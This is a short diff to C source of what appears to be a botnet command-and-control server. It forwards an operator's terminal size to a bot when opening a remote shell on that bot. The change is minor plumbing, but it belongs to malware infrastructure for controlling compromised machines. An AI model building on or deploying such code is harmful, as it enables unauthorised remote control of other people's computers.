@@ -85,6 +85,7 @@ void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_
     struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)uData;
     struct sLaika_cnc *cnc = aInfo->info.cnc;
     struct sLaika_peer *peer;
+    uint16_t cols, rows;
 
     /* sanity check, make sure shell isn't already open */
     if (aInfo->shellBot)
@@ -98,12 +99,19 @@ void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_
     if (peer->type != PEER_BOT)
         LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer isn't a bot!\n");
 
+    /* read term size */
+    laikaS_readInt(&authPeer->sock, &cols, sizeof(uint16_t));
+    laikaS_readInt(&authPeer->sock, &rows, sizeof(uint16_t));
+
     /* link shells */
     aInfo->shellBot = peer;
     ((struct sLaika_botInfo*)(peer->uData))->shellAuth = authPeer;
 
     /* forward the request to open a shell */
-    laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_OPEN);
+    laikaS_startOutPacket(peer, LAIKAPKT_SHELL_OPEN);
+    laikaS_writeInt(&peer->sock, &cols, sizeof(uint16_t));
+    laikaS_writeInt(&peer->sock, &rows, sizeof(uint16_t));
+    laikaS_endOutPacket(peer);
 }
 
 void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
